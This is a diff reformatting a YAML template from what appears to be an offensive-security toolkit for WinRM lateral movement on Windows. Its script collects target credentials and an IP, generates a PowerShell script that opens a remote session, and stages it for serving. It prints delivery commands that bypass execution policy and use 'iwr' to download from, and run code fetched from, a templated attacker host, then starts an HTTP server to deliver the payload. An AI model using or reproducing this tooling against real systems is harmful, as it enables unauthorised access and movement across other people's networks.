@@ -1,31 +1,29 @@
+---
 metadata:
-  filename: lateral-movement-template-WinRM-powershell-revshell.yaml
-  tags:
-  - shell
-  - windows
-  created: '2025-03-29'
-  author: Unknown
-content: "echo \"Answer the following with valid user credentials and a target ip.\
-  \ A powershell script will be generated. If successful, you can connect to the session\
-  \ by using powershell\"; \\\nread --prompt-str \"Target Username:\" username; \\\
-  \nread --prompt-str \"Target Password:\" password; \\\nread --prompt-str \"Target\
-  \ IP:\" target; \\\n\necho \"\\$username = '$username';\" > lateral-movement-winrm.ps1;\
-  \ \\\necho \"\\$password = '$password';\" >> lateral-movement-winrm.ps1; \\\necho\
-  \ \"\\$secureString = ConvertTo-SecureString \\$password -AsPlaintext -Force;\"\
-  \ >> lateral-movement-winrm.ps1; \\\necho \"\\$credential = New-Object System.Management.Automation.PSCredential\
-  \ \\$username, \\$secureString;\" >> lateral-movement-winrm.ps1; \\\necho \"New-PSSession\
-  \ -ComputerName $target -Credential \\$credential\" >> lateral-movement-winrm.ps1;\
-  \ \\\n\nmkdir -p packstation/outbound; mv lateral-movement-winrm.ps1 packstation/outbound/;\
-  \ \\\necho '================================================================'; \\\
-  \necho '                      -----PowerShell-----                      '; \\\n\
-  echo 'Without bypass: Open the created file lateral-movement-winrm.ps1 and paste\
-  \ in line by line into powershell'; \\\necho 'Preparation 1 (for save to disk only):\
-  \ powershell -ep bypass'; \\\necho 'Deliver & save to disk: iwr -uri http://{{ attacker_ip\
-  \ }}:{{ delivery_outbound_port }}/lateral-movement-winrm.ps1 -Outfile {{ delivery_path_windows\
-  \ }}\\lateral-movement-winrm.ps1'; \\\necho 'Deliver, save to disk & execute: iwr\
-  \ -uri http://{{ attacker_ip }}/lateral-movement-winrm.ps1 -Outfile {{ delivery_path_windows\
-  \ }}\\lateral-movement-winrm.ps1; {{ delivery_path_windows }}\\lateral-movement-winrm.ps1';\
-  \ \\\necho 'Enter the session: Enter-PSSession <sessionId that is displayed>'; \\\
-  \necho '================================================================'; \\\n\
-  \ python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port\
-  \ }} -d packstation/outbound\n"
+  filename: "lateral-movement-template-WinRM-powershell-revshell.yaml"
+  tags: ["shell", "windows"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  echo "Answer the following with valid user credentials and a target ip. A powershell script will be generated. If successful, you can connect to the session by using powershell"; \
+  read --prompt-str "Target Username:" username; \
+  read --prompt-str "Target Password:" password; \
+  read --prompt-str "Target IP:" target; \
+
+  echo "\$username = '$username';" > lateral-movement-winrm.ps1; \
+  echo "\$password = '$password';" >> lateral-movement-winrm.ps1; \
+  echo "\$secureString = ConvertTo-SecureString \$password -AsPlaintext -Force;" >> lateral-movement-winrm.ps1; \
+  echo "\$credential = New-Object System.Management.Automation.PSCredential \$username, \$secureString;" >> lateral-movement-winrm.ps1; \
+  echo "New-PSSession -ComputerName $target -Credential \$credential" >> lateral-movement-winrm.ps1; \
+
+  mkdir -p packstation/outbound; mv lateral-movement-winrm.ps1 packstation/outbound/; \
+  echo '================================================================'; \
+  echo '                      -----PowerShell-----                      '; \
+  echo 'Without bypass: Open the created file lateral-movement-winrm.ps1 and paste in line by line into powershell'; \
+  echo 'Preparation 1 (for save to disk only): powershell -ep bypass'; \
+  echo 'Deliver & save to disk: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/lateral-movement-winrm.ps1 -Outfile {{ delivery_path_windows }}\lateral-movement-winrm.ps1'; \
+  echo 'Deliver, save to disk & execute: iwr -uri http://{{ attacker_ip }}/lateral-movement-winrm.ps1 -Outfile {{ delivery_path_windows }}\lateral-movement-winrm.ps1; {{ delivery_path_windows }}\lateral-movement-winrm.ps1'; \
+  echo 'Enter the session: Enter-PSSession <sessionId that is displayed>'; \
+  echo '================================================================'; \
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
